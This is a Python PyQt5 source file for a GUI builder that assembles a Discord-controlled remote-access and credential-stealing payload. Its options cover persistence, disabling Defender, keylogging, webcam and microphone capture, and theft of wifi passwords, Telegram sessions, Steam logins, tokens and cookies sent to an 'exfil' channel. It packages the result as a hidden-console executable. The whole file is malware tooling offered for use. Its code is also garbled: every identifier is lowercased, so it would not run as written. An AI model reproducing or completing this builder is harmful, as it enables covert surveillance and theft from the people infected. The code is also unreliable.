import sys, json, subprocess, os
from pyqt5.qtwidgets import *
from pyqt5.qtcore import qt

class buildergui(qmainwindow):
    def __init__(self):
        super().__init__()
        self.setwindowtitle("discord c2 builder")
        self.setgeometry(100, 100, 720, 850)
        central = qwidget()
        layout = qvboxlayout()

        groupfeat = qgroupbox("features")
        layoutfeat = qvboxlayout()
        self.cbpersist = qcheckbox("persistence")
        self.cbdefender = qcheckbox("disable defender")
        self.cbkeylog = qcheckbox("keylogger")
        self.cbwebcam = qcheckbox("webcam")
        self.cbscreenshot = qcheckbox("screenshot")
        self.cbscreenrec = qcheckbox("screen recording")
        self.cbmic = qcheckbox("microphone")
        self.cbfilesearch = qcheckbox("file search")
        self.cbwifi = qcheckbox("wifi passwords")
        self.cbclip = qcheckbox("clipboard")
        self.cbhistory = qcheckbox("browser history")
        self.cbtelegram = qcheckbox("telegram sessions")
        self.cbsteam = qcheckbox("steam login")
        self.cbtokens = qcheckbox("tokens + cookies + roblox")
        for cb in [self.cbpersist, self.cbdefender, self.cbkeylog, self.cbwebcam,
                   self.cbscreenshot, self.cbscreenrec, self.cbmic, self.cbfilesearch,
                   self.cbwifi, self.cbclip, self.cbhistory, self.cbtelegram,
                   self.cbsteam, self.cbtokens]:
            layoutfeat.addwidget(cb)
        groupfeat.setlayout(layoutfeat)

        groupparams = qgroupbox("discord settings")
        layoutparams = qformlayout()
        self.bottoken = qlineedit("your bot token")
        self.commandchan = qlineedit("command channel id")
        self.exfilchan = qlineedit("exfil channel id")
        self.pollinterval = qlineedit("30")
        self.fileexts = qlineedit(".txt,.doc,.pdf,.jpg,.wallet")
        self.maxsize = qlineedit("10")
        self.recordsec = qlineedit("30")
        layoutparams.addrow("bot token:", self.bottoken)
        layoutparams.addrow("command channel id:", self.commandchan)
        layoutparams.addrow("exfil channel id:", self.exfilchan)
        layoutparams.addrow("poll interval (s):", self.pollinterval)
        layoutparams.addrow("file extensions:", self.fileexts)
        layoutparams.addrow("max file size (mb):", self.maxsize)
        layoutparams.addrow("record seconds:", self.recordsec)
        groupparams.setlayout(layoutparams)

        groupout = qgroupbox("output")
        layoutout = qhboxlayout()
        self.outfile = qlineedit("payload.exe")
        layoutout.addwidget(qlabel("filename:"))
        layoutout.addwidget(self.outfile)
        groupout.setlayout(layoutout)

        self.buildbtn = qpushbutton("build payload")
        self.buildbtn.clicked.connect(self.build)

        layout.addwidget(groupfeat)
        layout.addwidget(groupparams)
        layout.addwidget(groupout)
        layout.addwidget(self.buildbtn)
        central.setlayout(layout)
        self.setcentralwidget(central)

    def build(self):
        config = {
            "bottoken": self.bottoken.text(),
            "commandchan": int(self.commandchan.text()),
            "exfilchan": int(self.exfilchan.text()),
            "pollinterval": int(self.pollinterval.text()),
            "persist": self.cbpersist.ischecked(),
            "disabledefender": self.cbdefender.ischecked(),
            "keylog": self.cbkeylog.ischecked(),
            "webcam": self.cbwebcam.ischecked(),
            "screenshot": self.cbscreenshot.ischecked(),
            "screenrec": self.cbscreenrec.ischecked(),
            "mic": self.cbmic.ischecked(),
            "filesearch": self.cbfilesearch.ischecked(),
            "wifi": self.cbwifi.ischecked(),
            "clipboard": self.cbclip.ischecked(),
            "history": self.cbhistory.ischecked(),
            "telegram": self.cbtelegram.ischecked(),
            "steam": self.cbsteam.ischecked(),
            "tokens": self.cbtokens.ischecked(),
            "fileexts": self.fileexts.text(),
            "maxfilesizemb": int(self.maxsize.text()),
            "recordseconds": int(self.recordsec.text())
        }
        with open("payloadstub.py", "r") as f:
            stub = f.read()
        stub = f"config = {json.dumps(config, indent=4)}\n\n" + stub
        with open("payload_compiled.py", "w") as f:
            f.write(stub)
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload_compiled.py", "-o", self.outfile.text()])
        qmessagebox.information(self, "done", f"payload saved as {self.outfile.text()}")

if __name__ == "__main__":
    app = qapplication(sys.argv)
    window = buildergui()
    window.show()
    sys.exit(app.exec_())
